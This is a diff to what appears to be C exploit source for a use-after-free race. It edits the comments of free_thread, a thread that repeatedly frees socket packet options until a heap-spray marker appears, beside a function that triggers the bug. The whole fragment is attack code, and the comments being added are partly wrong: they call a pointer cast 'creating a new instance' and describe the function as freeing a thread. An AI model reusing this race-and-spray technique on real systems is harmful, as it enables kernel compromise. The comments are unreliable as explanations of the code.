@@ -109,17 +109,24 @@ void *use_thread(void *arg) {
     o->triggered = o->done1 = 1;
 }
 
-// TODO: Add comment to this function
+// (Unsure) Function free's a opened thread
 void *free_thread(void *arg) {
+    // Create a new opaque struct instance using the function
+    // argument <arg>.
     struct opaque *o = (struct opaque *)arg;
+
+    // TODO: comment this part
     while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
         if (free_pktopts(o->master_sock))
             *(volatile int *)0;
-        
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
+
+        // Suspend process execution (100 us)
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
     }
-    o->triggered = 1;
-    o->done2 = 1;
+    
+    // Set the <triggered> and <done2> members of the opaque
+    // struct instace to (1) or (true)
+    o->triggered = o->done2 = 1;
 }
 
 // Triggers a Use-After-Free bug
